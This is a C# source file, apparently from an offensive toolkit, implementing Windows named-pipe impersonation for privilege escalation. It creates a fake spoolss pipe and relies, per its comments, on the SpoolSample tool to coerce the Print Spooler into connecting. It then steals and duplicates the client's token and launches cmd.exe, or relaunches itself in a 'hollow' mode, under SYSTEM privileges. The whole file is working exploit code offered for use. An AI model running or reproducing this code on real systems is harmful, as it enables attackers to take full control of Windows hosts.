using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using static Execution.Extensions.WinNative;

namespace Execution.Func
{
    public class NamedPipeImpersonation
    {
        // required user with SeImpersonatePrivilege
        // create a pipe server (print client) that will duplicate the security token of users connected to the pipe
        // and open a new shell with its privileges
        // abuse https://github.com/leechristensen/SpoolSample to force PrintSpooler connect to the named pipe
        public static void CreatePipe(string type)
        {
            string pipeName = $"\\\\.\\pipe\\test\\pipe\\spoolss";
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            if (hPipe == new IntPtr(-1))
            {
                Console.WriteLine($"Failed to create pipe. Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine($"Pipe created with name {pipeName}");

            if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
            {
                Console.WriteLine($"Failed to connect to pipe. Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("Client connected to pipe");

            if (!ImpersonateNamedPipeClient(hPipe))
            {
                Console.WriteLine($"Failed to impersonate client. Error: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("Impersonated the client");

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("Impersonated user is: " + name);
            RevertToSelf();

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            string currentExecutablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string command = currentExecutablePath;
            string args = "hollow";

            //if (!CreateProcessWithTokenW(hSystemToken, 0, command, args, 0, IntPtr.Zero, null, ref si, out pi))
            //{
            //    Console.WriteLine($"Failed to create process with token. Error: {Marshal.GetLastWin32Error()}");
            //    return;
            //}

            // if shell passed as argument it will spawn a new cmd.exe, else shellcode execution method
            if (type.Equals("shell"))
            {
                Console.WriteLine($"creating cmd as {name}");
                CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe", CreationFlags.UnicodeEnvironment, IntPtr.Zero, null, ref si, out pi);
            }
            else
            {
                Console.WriteLine($"creating {currentExecutablePath} exec as {name}");
                CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, $"\"{currentExecutablePath}\" hollow", CreationFlags.UnicodeEnvironment, IntPtr.Zero, null, ref si, out pi);
            }


        }
    }
}
